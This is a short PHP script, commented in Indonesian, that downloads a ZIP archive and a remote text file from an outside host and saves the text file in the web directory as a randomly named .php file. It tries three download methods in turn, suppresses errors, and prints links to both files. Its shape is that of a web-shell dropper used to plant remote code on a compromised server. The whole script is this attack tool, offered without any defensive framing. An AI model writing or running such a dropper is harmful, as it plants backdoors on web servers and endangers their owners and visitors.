<?php
$urlZip = "https://teamzedd2026.tech/media/uploads/r/k/wp.zip"; // URL ZIP
$url = "https://teamzedd2026.tech/media/uploads/r/k/z.txt"; // URL TXT

// Nama file
$zipName = "wp.zip"; // ZIP tidak diacak
$randomName = "file_" . bin2hex(random_bytes(5)) . ".php"; // PHP acak

$saveZip = __DIR__ . "/" . $zipName;
$savePath = __DIR__ . "/" . $randomName;

echo "<pre>🎯 Mengunduh ZIP: $urlZip\n🎯 Mengunduh TXT → PHP: $url\n</pre>";

$successZip = false;
$success = false;

// ===========================
// ==== DOWNLOAD ZIP ========
// ===========================

// 1. ZIP via file_get_contents
if ($data = @file_get_contents($urlZip)) {
    if (@file_put_contents($saveZip, $data)) {
        $successZip = true;
        $methodZip = "file_get_contents";
    }
}

// 2. ZIP fopen
if (!$successZip) {
    if (($in = @fopen($urlZip, "rb")) && ($out = @fopen($saveZip, "wb"))) {
        while (!feof($in)) fwrite($out, fread($in, 8192));
        fclose($in); fclose($out);
        $successZip = true;
        $methodZip = "fopen/fwrite";
    }
}

// 3. ZIP stream_copy
if (!$successZip && ($in = @fopen($urlZip, "rb")) && ($out = @fopen($saveZip, "wb"))) {
    if (stream_copy_to_stream($in, $out) > 0) {
        fclose($in); fclose($out);
        $successZip = true;
        $methodZip = "stream_copy_to_stream";
    }
}



// ===========================
// ==== DOWNLOAD PHP (TXT) ====
// ===========================

// 1. TXT → PHP via file_get_contents
if ($data = @file_get_contents($url)) {
    if (@file_put_contents($savePath, $data)) {
        $success = true;
        $method = "file_get_contents";
    }
}

// 2. TXT → PHP fopen
if (!$success) {
    if (($in = @fopen($url, "rb")) && ($out = @fopen($savePath, "wb"))) {
        while (!feof($in)) fwrite($out, fread($in, 8192));
        fclose($in); fclose($out);
        $success = true;
        $method = "fopen/fwrite";
    }
}

// 3. TXT → PHP stream_copy
if (!$success && ($in = @fopen($url, "rb")) && ($out = @fopen($savePath, "wb"))) {
    if (stream_copy_to_stream($in, $out) > 0) {
        fclose($in); fclose($out);
        $success = true;
        $method = "stream_copy_to_stream";
    }
}



// ===========================
// ==== OUTPUT ZIP & PHP =====
// ===========================
echo "<pre style='font-family:monospace'>";

if ($successZip) {
    echo "✅ ZIP berhasil via <b>$methodZip</b>\n";
    echo "📁 ZIP: <a href='$zipName'>$zipName</a>\n\n";
} else {
    echo "❌ ZIP GAGAL DIUNDUH\n\n";
}

if ($success) {
    echo "✅ PHP berhasil via <b>$method</b>\n";
    echo "📁 PHP: <a href='$randomName'>$randomName</a>\n\n";
} else {
    echo "❌ PHP GAGAL DIUNDUH\n\n";
}

echo "</pre>";
?>
